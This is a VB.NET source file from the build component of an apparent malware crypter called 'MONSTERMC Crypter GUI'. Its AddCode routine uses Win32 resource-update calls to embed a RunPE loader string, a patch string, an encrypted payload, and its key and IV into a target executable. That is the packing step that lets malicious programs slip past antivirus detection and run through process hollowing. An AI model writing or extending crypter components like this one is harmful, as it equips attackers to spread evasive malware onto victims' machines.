Imports System
Imports System.Runtime.InteropServices
Imports System.Text
Imports MONSTERMC.MONSTERMCCrypterGUI.Build
Namespace MONSTERMCCrypterGUI.Build
    Friend Class Build
        Public Shared Sub AddCode(ByVal filename As String, ByVal runpe As String, ByVal patch As String, ByVal payload As Byte(), ByVal key As String, ByVal iv As String)
            NativeMethods.AddResource(filename, "RUNPE", Encoding.UTF8.GetBytes(runpe))
            NativeMethods.AddResource(filename, "PATCH", Encoding.UTF8.GetBytes(patch))
            NativeMethods.AddResource(filename, "PAYLOAD", payload)
            NativeMethods.AddResource(filename, "KEY", Encoding.UTF8.GetBytes(key))
            NativeMethods.AddResource(filename, "Iv", Encoding.UTF8.GetBytes(iv))
        End Sub
    End Class
    Friend Class NativeMethods
        Public Const RT_VERSION As UInteger = 16UI
        Public Const RT_ICON As UInteger = 3UI
        Public Const RT_GROUP_ICON As UInteger = RT_ICON + 11UI

        Private Const RT_CURSOR As UInteger = &H1
        Private Const RT_BITMAP As UInteger = &H2
        Private Const RT_MENU As UInteger = &H4
        Private Const RT_DIALOG As UInteger = &H5
        Private Const RT_STRING As UInteger = &H6
        Private Const RT_FONTDIR As UInteger = &H7
        Private Const RT_FONT As UInteger = &H8
        Private Const RT_ACCELERATOR As UInteger = &H9
        Private Const RT_RCDATA As UInteger = &HA
        Private Const RT_MESSAGETABLE As UInteger = &HB

        Public Const RESOURCE_ONLY As UInteger = &H20UI Or &H2UI
        Public Const LOAD_LIBRARY_AS_DATAFILE As UInteger = &H2

        Public Const ENGLISH_USA As UShort = 1033
        <DllImport("kernel32.dll", CharSet:=CharSet.Unicode, SetLastError:=True)>
        Public Shared Function GetModuleHandle(
    <MarshalAs(UnmanagedType.LPWStr)> ByVal lpModuleName As String) As IntPtr
        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function FindResource(ByVal hModule As IntPtr, ByVal lpName As String, ByVal lpType As String) As IntPtr
        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function LoadResource(ByVal hModule As IntPtr, ByVal hResInfo As IntPtr) As IntPtr
        End Function

        <DllImport("kernel32.dll")>
        Private Shared Function LockResource(ByVal hResData As IntPtr) As IntPtr
        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function SizeofResource(ByVal hModule As IntPtr, ByVal hResInfo As IntPtr) As UInteger
        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function UpdateResource(ByVal hUpdate As IntPtr, ByVal lpType As UInteger, ByVal lpName As String, ByVal wLanguage As UShort, ByVal lpData As Byte(), ByVal cbData As UInteger) As Boolean
        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function BeginUpdateResource(ByVal pFileName As String,
                <MarshalAs(UnmanagedType.Bool)> ByVal bDeleteExistingResources As Boolean) As IntPtr
        End Function

        <DllImport("kernel32.dll", SetLastError:=True)>
        Private Shared Function EndUpdateResource(ByVal hUpdate As IntPtr, ByVal fDiscard As Boolean) As Boolean
        End Function
        Public Shared Function AddResource(ByVal fileName As String, ByVal name As String, ByVal bytes As Byte()) As Boolean
            Dim hUpdate = BeginUpdateResource(fileName, False)
            Dim result = UpdateResource(hUpdate, RT_RCDATA, name, 0, bytes, bytes.Length)
            EndUpdateResource(hUpdate, Not result)

            Return result
        End Function
    End Class
End Namespace
